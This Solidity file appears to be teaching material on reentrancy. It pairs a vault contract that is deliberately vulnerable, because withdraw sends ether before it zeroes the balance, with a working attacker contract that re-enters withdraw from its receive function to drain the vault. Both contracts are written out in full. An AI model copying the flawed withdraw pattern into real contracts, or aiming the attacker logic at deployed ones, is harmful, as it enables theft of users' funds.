// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// @title ReentrancyVulnerable
/// @notice A vulnerable vault demonstrating the classic reentrancy attack.
/// @dev VULNERABLE: External call before state update. DO NOT USE IN PRODUCTION.
contract ReentrancyVulnerable {
    /// @notice User balances in the vault
    mapping(address => uint256) public balances;

    /// @notice Emitted when ether is deposited
    event Deposit(address indexed user, uint256 amount);

    /// @notice Emitted when ether is withdrawn
    event Withdraw(address indexed user, uint256 amount);

    /// @notice Deposit ether into the vault
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /// @notice Withdraw all ether - VULNERABLE to reentrancy
    /// @dev VULNERABILITY: External call before state update
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // VULNERABILITY: External call before updating state
        // CEI pattern violated: Interactions before Effects
        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // State update AFTER external call
        balances[msg.sender] = 0;
        emit Withdraw(msg.sender, balance);
    }

    /// @notice Get contract balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @title ReentrancyAttacker
/// @notice Attacker contract that exploits the reentrancy vulnerability
contract ReentrancyAttacker {
    ReentrancyVulnerable public target;
    uint256 public attackCount;
    uint256 public constant ATTACK_LIMIT = 10;

    constructor(address _target) {
        target = ReentrancyVulnerable(_target);
    }

    /// @notice Initiates the attack by depositing then withdrawing
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    /// @notice Receive function that reenters the vulnerable contract
    receive() external payable {
        if (attackCount < ATTACK_LIMIT && address(target).balance >= 1 ether) {
            attackCount++;
            target.withdraw(); // Reentrant call
        }
    }

    /// @notice Get attacker's balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
